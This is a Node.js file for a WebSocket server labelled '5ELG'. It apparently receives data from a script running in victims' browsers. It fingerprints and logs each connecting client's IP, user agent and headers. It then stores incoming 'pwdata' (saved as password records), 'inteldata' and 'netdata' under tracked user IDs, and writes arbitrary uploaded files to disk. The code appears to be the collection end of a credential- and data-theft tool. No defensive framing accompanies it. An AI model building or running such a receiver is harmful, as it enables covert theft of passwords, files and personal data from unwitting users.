const WebSocket = require('ws');
const { sequelize, Log } = require('../../Functions/db'); // Import Log model
const { updateFingerprintRecordByFU, addFingerprintRecord, saveFileToUploadPath } = require('../../Functions/utils'); 

const crypto = require('crypto');
const url = require('url'); // To parse query parameters

// ANSI escape codes for colors and styles
const C = {
    Reset: "\x1b[0m",
    Bold: "\x1b[1m",
    Dim: "\x1b[2m",
    Red: "\x1b[31m",
    Green: "\x1b[32m",
    Yellow: "\x1b[33m",
    Cyan: "\x1b[36m",
    Magenta: "\x1b[35m",
    White: "\x1b[37m",
};

function runWebSocketServer(server) {
    // Start WebSocket server
    const wss = new WebSocket.Server({ server }); // Attach WebSocket server to the same HTTP/HTTPS server
    console.log(`${C.Green}[5ELG-WSS]${C.Reset} WebSocket server running at ${C.Cyan}wss://${process.env.HOST}:${(process.env.SSL_KEY_PATH && process.env.SSL_CERT_PATH ? process.env.SSL_PORT : process.env.PORT)}${C.Reset}`);

    // Handle WebSocket connections
    wss.on('connection', (ws, req) => {
        const clientIp = req.socket.remoteAddress; // Client IP address
        const userAgent = req.headers['user-agent'] || 'N/A'; // User-Agent (if available)
       
        const parsedUrl = url.parse(req.url, true); // `true` parses the query string into an object
        const queryParams = parsedUrl.query;
        const fuID = queryParams.u || 'N/B'; // Extract 'u' parameter
        const fbID = queryParams.b || 'N/B'; // Extract 'b' parameter
        // Store client ID on ws object for later reference (e.g., on disconnect)
        ws.fuID = fuID;

        console.log(`${C.Green}[5ELG-WS]${C.Reset} New client connected from ${C.Bold}${clientIp}${C.Reset} with User-Agent: ${C.Dim}${userAgent}${C.Reset}`);

        const hashReq = crypto.createHash('sha256').update(Buffer.from(JSON.stringify(req.headers)).toString('base64')).digest('hex');
        const requestData = {
            headers: req.headers,
            dealer_uri: req.headers.origin || '', // Origen de la petición
            merca_uri: req.headers.referer || 'N/A', // Origin of the request
            requestURL: req.originalUrl || req.url, // Indicating it's a WebSocket request
            method: 'WS-REQ', // WebSocket connection method
        };
        var encodedReq = Buffer.from(JSON.stringify(requestData)).toString('base64');
        const encodedSocketInfo = Buffer.from(req.socket.toString()).toString('base64');

        // Send a welcome message to the client
        if (fuID !== 'N/B') {
            try {
                const newRecordData = {
                    FU: fuID,
                    FB: fbID
                };
        
                const { record, created } = addFingerprintRecord(newRecordData);

                if (created) {
                    console.log(`${C.Green}[5ELG-WS]${C.Reset} New record added: ${C.Bold}${fuID}${C.Reset}`);
                } 
            } catch (error) {
                console.error(`${C.Red}Error adding new record:${C.Reset}`, error.message);
            }            
        }
        
        console.log(`${C.Dim}${hashReq}${C.Reset}`);
        

        // Log data
        const connectData = {
            Dl: 'WS-REQUEST',
            Ed: encodedReq, 
            Ts: new Date().toISOString(),
            Ip: clientIp,
            Ua: userAgent,
            Fu: fuID,
            Fb: fbID,
            Er: encodedReq,
            Fr: hashReq,
            Jd: encodedSocketInfo,
            Html: null,
            Screen: null,
        };
        
        try {
            Log.create(connectData); // Log data in the database
            ws.send('DEALED!');
            
        } catch (err) {
            console.error(`${C.Red}[5ELG-WebSocket-DEALER] Error logging data:${C.Reset}`, err.message);
        }

        // Handle messages from the client
        ws.on('message', async (message) => {
            console.log(`${C.Green}[5ELG-WS]${C.Reset} Received message:`, message);

            // Parse incoming data
            let parsedData;
            try {
                parsedData = JSON.parse(message); // Expecting JSON data from the client
            } catch (error) {
                console.error(`${C.Red}[5ELG-WS] Error parsing message:${C.Reset}`, error.message);
                ws.send('[5ELG-WS] Invalid message format. Please send JSON data.');
                return;
            }

            // Handle different id
            const { route, data } = parsedData;
            const { Fu, c } = data;

            switch (route) {
                case 'dealer':
                    console.log(`${C.Green}[5ELG-WebSocket-DEALER]${C.Reset} Dealer data received:`, data);
                    break;
                case 'file':
                    const { id, cont, n} = data;
                    saveFileToUploadPath(id, n, cont)
                    .then(() => {
                        console.log(`${C.Green}[5ELG-WebSocket-FILE]${C.Reset} File data received: ID=${C.Bold}${id}${C.Reset}`);
                    })
                    .catch((error) => {
                        console.error(`${C.Red}Error saving file:${C.Reset}`, error);
                    });

                    break;
                case 'inteldata':           
                    updateFingerprintRecordByFU(Fu, c, 'INTEL')
                        .then(record => {
                            if (record) {
                                console.log(`${C.Green}[5ELG-WebSocket-DATA]${C.Reset} Data received for user id ${C.Bold}${Fu}${C.Reset}`);
                            } else {
                                console.log(`${C.Dim}Record not found with the given.${C.Reset}`);
                            }
                        })
                        .catch(error => console.error(`${C.Red}Error:${C.Reset}`, error));
                    break;                
                case 'pwdata':               
                    updateFingerprintRecordByFU(Fu, c, 'PWD')
                        .then(record => {
                            if (record) {
                                console.log(`${C.Green}[5ELG-WebSocket-DATA]${C.Reset} Data received for user id ${C.Bold}${Fu}${C.Reset}`);
                            } else {
                                console.log(`${C.Dim}Record not found with the given.${C.Reset}`);
                            }
                        })
                        .catch(error => console.error(`${C.Red}Error:${C.Reset}`, error));
                    break;                
                case 'netdata':               
                    updateFingerprintRecordByFU(Fu, c, 'NETDATA')
                        .then(record => {
                            if (record) {
                                console.log(`${C.Green}[5ELG-WebSocket-DATA]${C.Reset} Data received for user id ${C.Bold}${Fu}${C.Reset}`);
                            } else {
                                console.log(`${C.Dim}Record not found with the given.${C.Reset}`);
                            }
                        })
                        .catch(error => console.error(`${C.Red}Error:${C.Reset}`, error));
                    break;
                default:
                    console.error(`${C.Red}[5ELG-WS] Unknown route:${C.Reset}`, route);
                    ws.send('[5ELG-WS] Unknown route.');
                    return;
            }

            // Echo the message back to the client
            ws.send('[5ELG-WebSocket-DEALER] Data processed successfully.');
        });

        // Handle disconnections
        ws.on('close', () => {
            
            // Log the client ID stored on ws object
            console.log(`${C.Dim}[5ELG-WS] Client disconnected: ID: ${ws.fuID}${C.Reset}`);
        });

        // Handle errors
        ws.on('error', (err) => {
            console.error(`${C.Red}[5ELG-WS] Error:${C.Reset}`, err.message);
        });
    });

    // Handle errors in the WebSocket server
    wss.on('error', (err) => {
        console.error(`${C.Red}[5ELG-WS] Server error:${C.Reset}`, err.message);
    });
}

module.exports = { runWebSocketServer };